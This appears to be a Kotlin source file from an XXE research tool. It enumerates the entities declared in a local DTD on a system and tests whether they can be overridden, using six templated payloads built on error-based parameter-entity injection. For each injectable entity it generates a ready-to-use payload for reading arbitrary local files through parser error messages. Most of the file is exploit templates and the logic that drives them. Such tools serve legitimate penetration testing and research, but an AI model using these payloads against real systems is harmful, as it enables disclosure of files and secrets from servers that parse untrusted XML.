
import com.sun.org.apache.xerces.internal.impl.dtd.*
import javax.xml.parsers.DocumentBuilderFactory

import org.xml.sax.InputSource;
import com.sun.org.apache.xerces.internal.util.SAXInputSource;
import com.sun.org.apache.xerces.internal.xni.parser.XMLEntityResolver
import com.sun.org.apache.xerces.internal.xni.parser.XMLErrorHandler
import com.sun.org.apache.xerces.internal.xni.parser.XMLInputSource
import com.sun.org.apache.xerces.internal.xni.parser.XMLParseException
import org.xml.sax.ErrorHandler
import org.xml.sax.SAXParseException
import java.io.*

class EntityTester {


    fun listOverridableEntities(dtdStream: InputStream): ArrayList<String> {
        val inputSource = InputSource(InputStreamReader(dtdStream))
        val source = SAXInputSource(inputSource)
        val d = XMLDTDLoader()

//    source.inputSourcexmlReader.entityResolver = EntityResolver {
//        publicId:String, systemId:String ->
//
//        println(publicId)
//        null
//    }

        d.errorHandler = object: XMLErrorHandler {
            override fun warning(domain: String?, key: String?, exception: XMLParseException?) {
            }

            override fun error(domain: String?, key: String?, exception: XMLParseException?) {
            }

            override fun fatalError(domain: String?, key: String?, exception: XMLParseException?) {
            }
        }

        d.entityResolver = XMLEntityResolver { resourceIdentifier ->
            //return XMLInputSource(resourceIdentifier);
            if(resourceIdentifier != null) {
                XMLInputSource(resourceIdentifier.publicId, resourceIdentifier.baseSystemId, resourceIdentifier.baseSystemId)
            } else {
                XMLInputSource("a","b","c")
            }
        }

        val g = d.loadGrammar(source) as DTDGrammar

        //g.printElements()

        //Elements
//    var elementDeclIndex = 0
//    val elementDecl = XMLElementDecl()
//    while (g.getElementDecl(elementDeclIndex++, elementDecl)) {
//
//        println(elementDecl.name.rawname)
//        //println(elementDecl.contentModelValidator.toString());
//    }
//
//    //Attributes
//    var attDeclIndex = 0
//    val attDecl = XMLAttributeDecl()
//    while (g.getAttributeDecl(attDeclIndex++, attDecl)) {
//
//        println(attDecl.name.rawname)
//    }



//            val errorReporter = object: XMLErrorReporter() {
//            fun reportError(location: XMLLocator?, domain: String?, key: String?, arguments: Array<out Any>?, severity: Short, exception: java.lang.Exception?): String {
//                if(key == "EntityNotDeclared") {
//                    println("Entity not declared : "+arguments!!.get(0))
//                }
//
//                return super.reportError(location, domain, key, arguments, severity, exception)
//            }
//
//        }

        val entitiesFound = ArrayList<String>()

        //Entities
        var entityIndex = 0
        val entityDecl = XMLEntityDecl()
        while (g.getEntityDecl(entityIndex++, entityDecl)) {
            entitiesFound.add(entityDecl.name)
            //println(entityDecl.name)
        }
        return entitiesFound
    }

    fun findInjectableEntity(dtdFullPath:String, originalPath:String, entitiesToTests:ArrayList<String>, reporter:XxeReporter) {

        val factory = DocumentBuilderFactory.newInstance()
        val builder = factory.newDocumentBuilder()

        //The parser will likely logged to the console Fatal error .. We can disable all this for cleaner output
        builder.setErrorHandler(
            object : ErrorHandler {
                override fun warning(exception: SAXParseException?) {
//                    println(" [!] ${exception!!.message}")
                }

                override fun error(exception: SAXParseException?) {
//                    println(" [!!] ${exception!!.message}")
                }

                override fun fatalError(exception: SAXParseException?) {
//                    println(" [!!!] ${exception!!.message}")
                }

            }
        )

        try {
            val payload = """
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
    %local_dtd;
]>
<message></message>
"""
            builder.parse(ByteArrayInputStream(payload.toByteArray(Charsets.UTF_8)))
        }
        catch (e:Exception) { //The DTD is probably malformed
            println(" [??] ${e.javaClass.name} : ${e.message}")
        }



        println("Testing ${entitiesToTests.size} entities : $entitiesToTests")

        for(entity in entitiesToTests) {
            val entityName = entity.replace("%","")
            //val xmlFile = String().javaClass.getResourceAsStream("/input.xml")
            val magicValue = "INJECTION_12345"

            //#1 Inline
            val payloadInline = """
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">

    <!ENTITY % $entityName '
        <!ENTITY &#x25; file "$magicValue">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
"""

            //#2 Inside tag
            val payloadElementSimple = """
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">

    <!ENTITY % $entityName '>
        <!ENTITY &#x25; file "$magicValue">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
"""
            //#3 Closing Quotes
            var payloadElementQuotes = """
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">

    <!ENTITY % $entityName '123)*">
        <!ENTITY &#x25; file "$magicValue">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ENTITY &#x25; aa "(bb|aa'>

    %local_dtd;
]>
<message></message>
"""
            payloadElementQuotes = """
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">

    <!ENTITY % $entityName '
        <!ENTITY &#x25; file "$magicValue">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ENTITY &#x25; aa "(bb|aa'>

    %local_dtd;
]>
<message></message>
"""

            //#4 Open parentheses
            val payloadElementOpenParentheses = """
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">

    <!ENTITY % $entityName '(aa)>
        <!ENTITY &#x25; file "$magicValue">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
"""

            //#5 Closing parentheses
            val payloadElementClosingParentheses = """
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">

    <!ENTITY % $entityName 'aaa)>
        <!ENTITY &#x25; file "$magicValue">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
"""

            //#6 Attribute list
            val payloadAttributeList = """
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">

    <!ENTITY % $entityName '(aa) #IMPLIED>
        <!ENTITY &#x25; file "$magicValue">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
"""

            val payloads = arrayOf(payloadInline,
                    payloadElementSimple,payloadElementOpenParentheses,payloadElementClosingParentheses,payloadElementQuotes,
                    payloadAttributeList)

            //val payloads = arrayOf(payloadElementQuotes)

            for (payload in payloads) {
//                println(" [-] Entity name: $entityName")
//
                try {
                    builder.parse(ByteArrayInputStream(payload.toByteArray(Charsets.UTF_8)))


//                    println("?????")
                } catch (e: FileNotFoundException) {
                    if (e.message!!.contains(magicValue)) {
                        println(" [+] The entity $entity is injectable")

                        var payloadClean = payload.replace("\"$magicValue\"","SYSTEM \"file:///YOUR_FILE\"")
                        payloadClean = payloadClean.replace(dtdFullPath,originalPath).trim()
                        reporter.newPayload("/$originalPath", entity, payloadClean)

                        //println("Payload used:")
                        //println(payload)
                    }
                } catch (e: Exception) {
                    //Failed
//                    println(" [!] $e.message")
                }
            }
        }


        //val entries = doc.getElementsByTagName("*")

//    for (i in 0 until entries.length) {
//        val element = entries.item(i) as Element
//        System.out.println("Found element " + element.getNodeName() + element.textContent)
//
//    }
    }

}
